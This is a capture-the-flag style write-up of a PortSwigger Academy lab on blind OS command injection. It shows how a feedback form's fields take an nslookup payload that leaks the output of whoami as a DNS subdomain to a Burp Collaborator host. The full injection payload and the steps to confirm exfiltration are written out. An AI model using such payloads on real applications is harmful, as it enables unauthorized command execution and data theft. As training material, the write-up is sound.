# Lab: Blind OS command injection with out-of-band data exfiltration

 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

**Note**
*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. *


## Different ways of injecting commands

Just as an example, notice how the date command can be used with echo

```bash
# With nothing echo just sends the word date
└─$ echo date    
date

# with a $(command) the date command is executed
└─$ echo $(date)                                                                                             130 ⨯
Thu Dec 22 02:10:43 PM EST 2022

# backticks can do the same thing
└─$ echo `date` 
Thu Dec 22 02:10:44 PM EST 2022
```

# Step 1 Get attack server url from burp collaborator

I do this from the collaborator tab and then clicking the `copy to clipboard` button:

![image](https://user-images.githubusercontent.com/83407557/209216542-a9fc0f44-be83-4312-9f42-6cad190b9513.png)

giving me the following url:

ugee6gsm1bwnti6ai4lp316ngem5avyk.oastify.com

# Step 2 Inspect feedback request to find OS command injection

![image](https://user-images.githubusercontent.com/83407557/209216839-3c1dcad7-0f34-4181-a3ec-fa98c1f3ef7b.png)

Capturing this POST request, 4 potential injection point are found

![image](https://user-images.githubusercontent.com/83407557/209216944-252c4d1e-0ade-4f52-949b-3071261743b4.png)


# Step 2 create a payload

Since I need the output of `whoami` I will use the following command to send that as a subdomain for my attack server with the following:

```bash
|| nslookup `whoami`.ugee6gsm1bwnti6ai4lp316ngem5avyk.oastify.com ||
```
# Step 3 inject payload at each point:

*note: payload are url-encoded*

![image](https://user-images.githubusercontent.com/83407557/209217468-4bcbaa62-a498-41c6-a5a1-d097622c35e9.png)


however I get an error because the name parameter is too long:

![image](https://user-images.githubusercontent.com/83407557/209217738-b3cb60c1-386f-46b9-98f7-e12a055293f0.png)

Sending the payloads on the other three fields only the error goes away

![image](https://user-images.githubusercontent.com/83407557/209218029-e0b7623e-c5f8-495e-be76-bb2735d561de.png)

![image](https://user-images.githubusercontent.com/83407557/209218072-b1d3e30c-4c4d-4b83-adf3-5ebe2190adc7.png)

# Step 4 check attack server logs

I see that DNS requests were made, and they contain the username as a subdomain:

![image](https://user-images.githubusercontent.com/83407557/209218339-639eac2b-0daf-4a8f-bf3a-c7b7c1b3d262.png)


# Step  5 Submit username 

![image](https://user-images.githubusercontent.com/83407557/209218457-43ae5b0b-9462-4461-9719-9d445c3dd23e.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/209218541-5fae3325-f135-4d57-8ec2-8f234c5b0f13.png)

